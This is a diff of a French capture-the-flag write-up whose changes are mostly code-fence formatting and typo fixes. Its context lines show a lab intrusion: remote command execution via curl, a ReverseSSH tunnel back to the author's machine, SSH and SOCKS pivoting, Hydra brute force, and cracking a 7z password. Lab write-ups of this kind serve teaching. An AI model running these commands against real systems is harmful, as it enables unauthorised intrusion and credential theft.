@@ -251,7 +251,7 @@ by Ben "epi" Risher 🤓                 ver: 2.4.0
 
 Le script *b.php* contient un formulaire avec un champ caché baptisé *command* qui par défaut va lister le contenu de */etc/backup/*. La cible de ce script est le fichier *c.php*. On est là dans un cas très simple d'exécution de commande distante (RCE).  
 
-```bash
+```console
 $ curl -XPOST http://192.168.1.50:8111/c.php --data "command=id"
 <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -447,19 +447,19 @@ if(isset($_GET['cmd'])){
 
 Sur le serveur je peux rappatrier un [ReverseSSH](https://github.com/Fahrj/reverse-ssh) pour établir un tunnel avec ma machine :  
 
-```bash
+```console
 $ ./reverse-sshx64 -v -p 4444 192.168.1.47
 ```
 
 Sur ma machine j'étais à l'écoute :  
 
-```bash
+```console
 $ ./reverse-sshx64 -v -l -p 4444
 ```
 
 Une fois le tunnel établit il suffit d'utiliser le port SSH local 8888 comme si il s'agissait du serveur SSH de notre victime.  
 
-```bash
+```console
 $ ssh -p 8888 127.0.0.1
 ```
 
@@ -620,7 +620,7 @@ PORT   STATE SERVICE
 
 Une connexion à ce port 24 à l'aide de Netcat révèle qu'il s'agit d'un serveur SSH. On va utiliser un premier pivot pour y accéder :  
 
-```bash
+```console
 $ ssh -N -L 2424:172.31.20.194:24 -p 8888 127.0.0.1
 ```
 
@@ -628,7 +628,7 @@ Ici j'utilise le tunnel SSH existant avec la première machine pour forwarder en
 
 J'ai rajouté les identifiants de base de données et autres dumps SQL à ma liste d'utilisateurs et passwords potentiels. Je passe le tout à Hydra :  
 
-```
+```console
  $ ./hydra -e nsr -L /tmp/users.txt -P /tmp/pass.txt ssh://127.0.0.1:2424/
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -645,7 +645,7 @@ Pwned ! Dans */root* on trouve le flag *{{tryharder:391}}* et un autre dans la c
 {% endraw %}
 
 {% raw %}
-```
+```console
 root@cfbd57786836:~# cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -730,7 +730,7 @@ Host script results:
 
 C'est là où ça devient un poil plus tricky. Grâce à notre accès SSH sur la seconde machine (forwardé sur le port 2424 local) on va créer un serveur proxy SOCKS via SSH qui permettra d'atteindre les machines de ce réseau (et surtout le serveur Samba).  
 
-```
+```console
 $ ssh -D 1080 -N -p 2424 root@127.0.0.1
 ```
 
@@ -742,9 +742,9 @@ socks5 127.0.0.1 1080
 
 [Proxychains](https://github.com/rofl0r/proxychains-ng) permet de chainer plusieurs proxies, il suffit de les mettre les un après les autres (dans l'ordre, ligne après ligne).  
 
-Avec smbclient je peux établir une connexion invité et lister les partages :  
+Avec `smbclient` je peux établir une connexion invité et lister les partages :  
 
-```
+```console
 $ ./proxychains4 -f proxychains.conf smbclient -U "" -N -L //172.31.200.204
 [proxychains] config file found: proxychains.conf
 [proxychains] preloading ./libproxychains4.so
@@ -772,7 +772,7 @@ Malheureusement l'accès aux partages est protégé. J'ai tenté de bruteforcer 
 
 Et en testant à la mano avec smbclient :  
 
-```
+```console
 $ ./proxychains4 -f proxychains.conf smbclient -U "larryjr" //172.31.200.204/users
 [proxychains] config file found: proxychains.conf
 [proxychains] preloading ./libproxychains4.so
@@ -818,7 +818,7 @@ Un flag (*{{tryharder:2020}}*) et une notice explicative :
 Comme on s'en doutait l'archive 7z restante est protégée par mot de passe. J'utilise l'utilitaire 7z2john puis je casse en générant les mots de passe possibles à la volée :  
 
 {% raw %}
-```
+```console
 $ python3 -c 'for i in range(100): print("{{tryharder:" + str(i) + "}}")' | ./john --stdin /tmp/hash.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 128/128 AVX 4x AES])
@@ -838,9 +838,9 @@ Session completed.
 We would have such a very good time
 -----------------------------------
 
-Pour terminer intéressons nous au port SSH accessible uniquement depuis l'intéreur du réseau.  
+Pour terminer intéressons-nous au port SSH accessible uniquement depuis l'intérieur du réseau.  
 
-```
+```console
 $ ./proxychains4 -q -f proxychains.conf hydra -e nsr -L /tmp/users.txt -P /tmp/pass.txt ssh://172.31.200.1/
 Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -854,7 +854,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra)
 
 Et à partir de là :  
 
-```
+```console
 $ sudo -l
 sudo: unable to resolve host myhouse7
 [sudo] password for admin: 
@@ -876,9 +876,9 @@ Oups il manque un flag que j'ai du rater sur l'énumération web. Pas de panique
 wapiti -u http://192.168.1.50:8115/ -v2 --color -m ''
 ```
 
-Ngrep le voit transiter dans le pages crawlées :  
+Ngrep le voit transiter dans les pages crawlées :  
 
-```
+```console
 $ sudo ngrep -q -d enp3s0 tryharder "host 192.168.1.50"
 interface: enp3s0 (192.168.1.0/255.255.255.0)
 filter: ( host 192.168.1.50 ) and ((ip || ip6) || (vlan && (ip || ip6)))
@@ -887,7 +887,7 @@ T 192.168.1.47:51848 -> 192.168.1.50:8115 [AP] #160
   token=VEAiR1kR79jMeKa9poYANMNof3VpFKherzzebo7PcofDyOe5pphilyPQ1rHNjHc3&flag=%7B%7Btryharder%3A104%7D%7D&user=alice&pass=Letm3in_
 ```
 
-Ngrep voit la requête POST générée par Wapiti mais n'a pas vu le flag dans la page web, vraisemblablement parce que le serveur a envoyé sa réponse compressée.  
+Ngrep voit la requête POST générée par Wapiti, mais n'a pas vu le flag dans la page web, vraisemblablement parce que le serveur a envoyé sa réponse compressée.  
 
 Si on se rend sur la page de login administrateur du CMS on retrouve bien le flag :  
 
